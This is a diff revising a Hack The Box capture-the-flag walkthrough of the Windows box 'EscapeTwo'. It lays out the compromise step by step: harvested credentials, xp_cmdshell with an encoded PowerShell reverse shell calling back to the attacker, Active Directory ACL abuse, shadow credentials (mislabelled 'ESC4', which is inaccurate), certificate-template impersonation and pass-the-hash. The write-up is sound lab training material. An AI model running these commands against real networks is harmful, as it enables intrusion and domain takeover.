@@ -3,17 +3,18 @@
 Difficulty: Easy
 OS: Windows
 Category: Offensive
+Date: 2025-11-22T12:57:50.537Z
 
 ![escapeTwo.webp](escapeTwo.webp)
 
 - **NOTE**
-    
+
     No Images ahead because my kali froze, due to *netexec*
-    
+
 
 ### Reconnaissance
 
-Using `nmap -sCV 10.10.11.51 -oN escape2-scans`
+I begin with `nmap -sCV 10.10.11.51 -oN escape2-scans`.
 
 ```bash
 PORT     STATE SERVICE       REASON          VERSION
@@ -140,7 +141,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
-Looking at the scan results, there’s DC named `DC01.sequel.htb` so let’s add this in out `/etc/hosts` 
+The scan identifies the domain controller as `DC01.sequel.htb`, so I add it to `/etc/hosts`.
 
 ```bash
 10.10.11.51     sequel.htb DC01.sequel.htb
@@ -148,7 +149,7 @@ Looking at the scan results, there’s DC named `DC01.sequel.htb` so let’s add
 
 ### SMB Enumeration
 
-You can use various tools to enumerate the shares of the host such as: `smbmap` `smbclient` `crackmapexec` & `netexec` 
+I can use various tools to enumerate the shares of the host such as: `smbmap` `smbclient` `crackmapexec` & `netexec`
 
 ```bash
 nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares
@@ -156,20 +157,20 @@ nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares
 # This is a pre-given credential, check on the HTB
 ```
 
-Access the share *Accounting Department*
+I access the share *Accounting Department*
 
 ```bash
 smbclient '//10.10.11.51/Accounting Department' -U rose%KxEPkKe6R8su
 ```
 
-Then download the two files you see using `get` 
+Then I download the two files I see using `get`
 
 > **.xlsx** files can be treated as a ZIP archive file. Inside there are multiple folders and files that stores data, formatting and settings.
-> 
+>
 
-Unzipping `accounts.xlsx` gives us `sharedStrings.xml` which contains a lot of credentials. You can use online “**XML Pretty Print**” to get a pretty view of the xml file.
+Unzipping `accounts.xlsx` gives me `sharedStrings.xml` which contains a lot of credentials. I can use online “**XML Pretty Print**” to get a pretty view of the xml file.
 
-Save these credentials on 2 separate files for *user* and *password*
+I save these credentials on 2 separate files for *user* and *password*
 
 ```bash
  angela	0fwz7Q4mSpurIt99
@@ -178,13 +179,13 @@ Save these credentials on 2 separate files for *user* and *password*
  sa	MSSQLP@ssw0rd!
 ```
 
-Enumerate for any valid credentials
+I enumerate for any valid credentials
 
 ```bash
 nxc smb 10.10.11.51 -u user -p pass
 ```
 
-You will find a valid credential for *oscar*
+I'll find a valid credential for *oscar*
 
 ### Establish Foothold
 
@@ -195,9 +196,9 @@ impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
 ```
 
 > **SA** or System Administrator account is a built-in superuser account in MSSQL with full administrative privileges and should be disabled if not needed.
-> 
+>
 
-Enable **xp_cmdshell** to exploit
+I enable **xp_cmdshell** to exploit
 
 ```bash
 SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1;
@@ -209,7 +210,7 @@ INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from
 SQL (sa  dbo@master)> RECONFIGURE;
 ```
 
-Generate a shell  from [RevShell Generator](https://www.revshells.com/). You can use anything for a shell, but I use Powershell Base64
+I generate a shell  from [RevShell Generator](https://www.revshells.com/). I can use anything for a shell, but I use Powershell Base64
 
 ```bash
 SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADYAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
@@ -217,7 +218,7 @@ SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIA
 
 This will establish a foothold for the user `sql_svc`
 
-At directory `C:\` there’s a folder named `SQL2019` read the file `sql-configuration.INI` and you’ll get the following:
+I read `C:\SQL2019\sql-configuration.INI` and find the following configuration:
 
 ```bash
 [OPTIONS]
@@ -230,7 +231,7 @@ SAPWD="MSSQLP@ssw0rd!"
 ADDCURRENTUSERASSQLADMIN="False"
 ```
 
-Let’s enumerate again for valid users. Before doing this, look at the possible users at `C:\Users` and add `sql_svc` and/or `ryan` to your users
+I check `C:\Users`, add the discovered accounts to my user list, and test the recovered credentials again.
 
 ```bash
 nxc smb 10.10.11.51 -u users -p 'WqSZAF6CysDQbGb3'
@@ -238,7 +239,7 @@ nxc smb 10.10.11.51 -u users -p 'WqSZAF6CysDQbGb3'
 
 This will match on a user named `ryan`
 
-Get the user flag at `Desktop` directory by establishing an `evil-winrm` 
+I get the user flag at `Desktop` directory by establishing an `evil-winrm`
 
 ```bash
 evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
@@ -246,25 +247,25 @@ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
 
 ### Privilege Escalation
 
-Run `bloodhound-python` to map the Active Directory. Use `faketime` or `ntpdate` to adjust the *clockskew* to avoid errors
+I run `bloodhound-python` to map the Active Directory. I use `faketime` or `ntpdate` to adjust the *clockskew* to avoid errors
 
 ```bash
 bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -c All --zip
 ```
 
-With the extracted data, look on every nodes, you can view all users with `@sequel.htb` 
+I inspect the collected BloodHound data, using `@sequel.htb` to find domain accounts.
 
-The most noteworthy here is from `ryan@sequel.htb` it has `WriteOwner` permission on Certificate Authority user (ca_svc). This means that Ryan can modify or take ownership of the ca_svc account. We could potentially exploit this and privilege escalate. Refer to this for more info in abusing `WriteOwner` permissions: [https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit)
+The most noteworthy here is from `ryan@sequel.htb` it has `WriteOwner` permission on Certificate Authority user (ca_svc). This means that Ryan can modify or take ownership of the ca_svc account. I could potentially exploit this and privilege escalate. Refer to this for more info in abusing `WriteOwner` permissions: [https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit)
 
 ### Grant Ownership
 
-Firstly, I will change the ownership of ca_svc accoutnt to ryan. This set the ryan as the owner of ca_svc object and has full control over it.
+Firstly, I'll change the ownership of ca_svc accoutnt to ryan. This set the ryan as the owner of ca_svc object and has full control over it.
 
 ```bash
 impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
 ```
 
-Then Grant Rights with DACL (Discretionary Access Control List) controls who can do what to an object in Active Directory. By giving FullControl to ryan we can use it to privilege escalate.
+I then grant Ryan FullControl over the `ca_svc` object by modifying its discretionary access control list (DACL):
 
 ```bash
 impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
@@ -273,23 +274,23 @@ impacket-dacledit -action write -rights FullControl -principal ryan -target ca_s
 ### Shadow Credentials Attack (ESC4)
 
 > **ESC4** abuses the Key Credentials property of Active Directory accounts, allowing an attacker to authenticate as another user using a certificate-based authentication bypass.
-> 
+>
 
 This attack will add malicious Key Credential to ca_svc and allows ryan to authenticate as ca_svc using certificate instead of a password.
 
-**NOTE: Always Keep an eye for clock skew errors**
+I keep the domain controller's clock offset in mind when running these Kerberos commands.
 
 ```bash
 certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
 ```
 
-Find a vulnerable certificate template using
+I find a vulnerable certificate template using
 
 ```bash
 certipy-ad find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
 ```
 
-Now, using the template we request a certificate as administrator
+Now, using the template I request a certificate as administrator
 
 ```bash
 certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb
@@ -302,13 +303,13 @@ certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-Now we get the hash for administrator
+Now I get the hash for administrator
 
 ```bash
 certipy-ad auth -pfx administrator.pfx
 ```
 
-Then use *evil-winrm* to get the **root** flag
+Then I use *evil-winrm* to get the **root** flag
 
 ```bash
 evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
